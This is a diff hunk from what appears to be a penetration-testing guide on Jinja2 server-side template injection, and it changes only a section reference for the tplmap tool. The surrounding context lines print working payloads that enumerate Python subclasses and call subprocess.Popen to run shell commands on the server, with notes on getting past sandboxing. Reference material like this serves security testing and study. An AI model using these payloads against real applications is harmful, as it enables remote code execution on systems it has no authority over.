@@ -466,7 +466,7 @@ ${{7*7}}
 {{ ''.__class__.__mro__[1].__subclasses__() }}                                   # if self/config are blocked: enumerate loaded subclasses to find e.g. subprocess.Popen
 {{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}   # INDEX = the subprocess.Popen (or similar) index from the enumeration above
 ```
-The exact working gadget depends on the Jinja2 version and whether the app uses a plain `Environment` (unsandboxed, classic one-liner works directly) or `jinja2.sandbox.SandboxedEnvironment` (blocks direct `__builtins__` access — fall back to the subclass-enumeration chain, and expect the subclass index to vary per target). If neither classic payload fires cleanly, use tplmap (§7.5) to search for the right gadget/index automatically.
+The exact working gadget depends on the Jinja2 version and whether the app uses a plain `Environment` (unsandboxed, classic one-liner works directly) or `jinja2.sandbox.SandboxedEnvironment` (blocks direct `__builtins__` access — fall back to the subclass-enumeration chain, and expect the subclass index to vary per target). If neither classic payload fires cleanly, use tplmap (§7.7) to search for the right gadget/index automatically.
 
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
 
